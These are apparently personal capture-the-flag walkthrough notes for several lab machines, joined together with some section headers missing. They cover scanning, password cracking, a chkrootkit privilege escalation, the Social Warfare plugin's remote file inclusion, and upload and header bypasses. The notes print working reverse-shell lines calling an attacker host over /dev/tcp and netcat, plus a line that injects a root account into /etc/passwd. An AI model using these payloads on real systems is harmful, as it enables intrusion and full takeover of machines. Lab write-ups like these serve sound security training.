#### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.80.85 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

No results were listed.

### Exploitation

Retrieved the zip file using `curl http://192.168.80.85/save.zip --output save.zip`.

The zip file is locked. Therefore, cracking with fcrackzip and rockyou password list gives the password as `manuel`. Extracting it gives the files passwd, group, hostname, shadow and sudoers from the `/etc/` directory.

The users identified are `root` with bash and user `296640a3b825115a47b68fc44501c828` with restricted bash.

The shadow file contains the hashed password for the identified user. Therefore, sending the entry to john for cracking gives the credentials as `296640a3b825115a47b68fc44501c828:server`. This can be used for sshing into the server.

The shell received is a restricted shell. Tries many things to escape from the shell. The only thing that worked was to append `-t "bash"` to the ssh command. This allowed the use of `/` in commands and therefore `/bin/cat`, which gives the user flag.

### Privilege Escalation

[PSPY](https://github.com/DominicBreuker/pspy) can be run on the machine. This gives a number of processes running. By looking at the output, the process `/bin/sh /root/chkrootkit-0.49/chkrootkit` is being run for about 5 seconds every minute. This coincides with the AV scan being run using the honeypot binary in the user's home directory.

Searchsploit lists a privilege escalation exploit. This exploit states that a file can be created by the name `update` and made executable. It will be executed by `chkrootkit` whenever it is run. The file must be placed under the `/tmp/` directory.

Therefore, a reverse shell code can be inserted into the file &rarr; `/bin/bash -i >& /dev/tcp/192.168.49.80/3002 0>&1`.

After a minute, a reverse shell is obtained as `root`. This gives the root flag.

### Enumeration

Machine IP &rarr; `192.168.72.73`

#### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.72.73`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                 |

#### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.72.73 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

Directories/files listed &rarr;

- img/ (301)
- image/ (301)
- admin/ (301)
- manual/ (301)
- server-status (403)
- bulma/ (301)

The robots.txt was checked manually during the scan was running. Robots file reveals a directory called `find_me`. This doesn’t contain any useful information either.

### Exploitation

None of the directories were really useful. The login pages inside the `/admin/` directory were empty. The `/bulma/` directory revealed an audio file in the wav format.

Uploading the wav file to an online audio decoder shows that the audio is morse code and the text states the presence of a user `trunks` with a password `u$3r`. This can be used to login to the ssh server running at the target. This gives us the user flag.

### Privilege Escalation

Enumerating for `sudo` and setuid binaries on the file system, there was no finding apart from the presence of the setuid binary `su`. Looked at the bash rc and history files. The history file contained the following interesting entries &rarr;

```
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
```

Checked the permissions of the `/etc/passwd` file and indeed the user `Trunks` owned the file. This allowed direct manipulation of the file. Therefore, added the above entry to the passwd file. Then logged in as Tom using the password that was encrypted in the above commands.

This gave the root shell and thereby the root flag.

GoBuster scan &rarr; `gobuster dir -u http://192.168.80.123 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

Directories/files listed &rarr;

- index.html

Running gobuster again for the wordpress directory gives additional results &rarr;

- index.php
- wp-content/
- wp-login.php
- wp-includes/
- readme.html
- license.txt
- wp-trackback.php
- wp-admin/
- xmlrpc.php
- wp-signup.php

The folders indicates that an instance of wordpress is running on the web server. Running wpscan on the webserver using the docker image by `docker run -it --rm wpscanteam/wpscan --url http://192.168.80.123/wordpress/` gives the following info &rarr;

- Directory listing enabled at `/wordpress/wp-content/uploads/`
- WP-Cron enabled at `/wordpress/wp-cron.php`
- Wordpress version 5.5 using generator tag at `/wordpress/index.php/feed/`
- Wordpress theme version 1.5 (latest is 1.8)
- User `admin` identified at `/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1`
- Outdated plugin Social Warfare 3.5.2 (latest is 4.3) identified at `/wordpress/wp-content/plugins/social-warfare/readme.txt`

### Exploitation

#### RFI and RCE

Using searchsploit to search for social warfare gives the result as an RCE for versions < 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in `/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=<RFI_URL>`.

#### Reverse shell

Visiting this page would give the result of the command in the payload url. The payload must be of the form &rarr;

`<pre>system('whoami')</pre>`. Checking the existence of netcat and bash, a new payload can be used for a reverse shell &rarr; `nc -e /bin/bash 192.168.49.80 3002`. This grants the user flag.

### Privilege Escalation

#### User

The users discovered from the reverse shell as `www-data` are `root` and `takis`. Looking through the config of wordpress in `wp-config.php`, a DB_password is found. This could be used for the `takis` user on ssh. This works and a user shell is obtained.

#### Root

The `takis` user is able to run sudo without a password for all commands. Therefore `sudo su` grants the root shell as well as the root flag.

Machine IP &rarr; `192.168.244.138`

#### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.138`

| 80       | HTTP        | Apache httpd 2.4.10 ((Ubuntu))                                  |

Directories/files listed &rarr;

- index.php
- icons/ (403)
- administration/ (403)

### Exploitation

Without much information from the web scan, the possibility to look at headers was apparent. Adding the `X-Forwarded-For: 192.168.244.138` header allows loading of the internal `/administration/` directory. The header needs to be added to all subsequent requests via burp intercept.

This directory has a login page which does not have SQLi type injections, however, default credentials of `admin:admin` work. The dashboard of the application gives the ability to upload a file, list users or log out. The `.../users` page does not list any useful information.

Note: There was a spelling error in the links, which needed to be modified to get correct response.

The interesting part was the upload functionality. It could be used to upload a reverse shell. However, the application does not directly allow php files. Bypassing this was checked by renaming the file and adding image headers to the content, but it didn't work.

The thing that worked was modifying the `Content-Type` header to `image/gif`. This allowed the upload of the reverse shell along with the path of the uploaded file. Navigating to the file grants a shell as the `www-data` user over netcat. This also gives the user flag.

### Privilege Escalation

#### User

Enumerating the `/etc/passwd` file, the users of importance are `root`, `yousef` and `speech-dispatcher`. The `/home/` directory contains a file `user.txt` file which has a base64 encoded string `c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=`.

Decoding this gives the credentials `yousef:yousef123`. Using this with ssh gives the shell as user `yousef`.

#### Root

Checking the `sudo -l` capabilities of `yousef`, it shows that `yousef` may run any command as root using `sudo`. Therefore, `sudo su` grants the root shell and thus, the root flag.
